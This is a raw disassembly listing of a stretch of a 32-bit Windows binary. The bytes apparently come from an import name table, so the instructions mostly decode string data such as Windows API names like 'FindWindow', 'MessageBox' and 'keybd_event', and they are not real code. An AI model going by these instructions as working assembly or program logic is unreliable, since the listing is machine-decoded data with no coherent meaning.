  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
